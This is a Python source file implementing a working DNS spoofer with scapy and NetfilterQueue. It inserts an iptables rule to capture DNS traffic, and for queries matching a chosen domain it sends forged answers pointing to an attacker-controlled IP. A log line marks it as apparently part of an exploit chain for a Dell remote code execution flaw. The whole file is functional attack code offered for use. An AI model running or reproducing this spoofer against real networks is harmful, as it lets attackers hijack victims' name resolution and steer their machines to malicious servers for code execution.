import os
import atexit

from scapy.all import *
from netfilterqueue import NetfilterQueue
from threading import Thread

monitor_domain = ""  # What we want to filter for
server_ip = ""  # What we want to redirect to


class DNSSpoofer:
    def __init__(self, subdomain, local_ip):
        global monitor_domain, server_ip
        monitor_domain = str(subdomain)
        server_ip = local_ip
        self.enable_dns_forwarding()

        self.nfqueue = NetfilterQueue()
        self.nfqueue.bind(1, packet_handler)
        thread = Thread(target=self.start_monitoring, args=(self,))
        thread.start()

        atexit.register(self.on_shutdown, self)
        print("[+] Started DNS Spoofer thread.")

    def start_monitoring(self, arg):
        self.nfqueue.run()


    def enable_dns_forwarding(self):
        os.system("iptables -t raw -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1")
        print("[+] DNS Forwarding enabled.")

    def disable_dns_forwarding(self):
        os.system("iptables -t raw -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1")
        print("[+] DNS Forwarding disabled.")

    def on_shutdown(self, arg):
        self.disable_dns_forwarding()


def generate_dns_response(packet):
    global server_ip

    ip = IP(src=packet.dst, dst=packet.src)
    udp = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)

    dnsrr = DNSRR(rrname=packet[DNSQR].qname, rdata=server_ip)
    dns = DNS(id=packet[DNS].id, qr=1, qd=packet[DNS].qd, an=dnsrr)

    return ip / udp / dns


def packet_handler(packet):
    global monitor_domain

    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNSQR):
        if monitor_domain in str(scapy_packet[DNS].qd.qname):
            print("[+] Dell RCE DNS request received.")
            send(generate_dns_response(scapy_packet), verbose=False)
            return
    packet.accept()
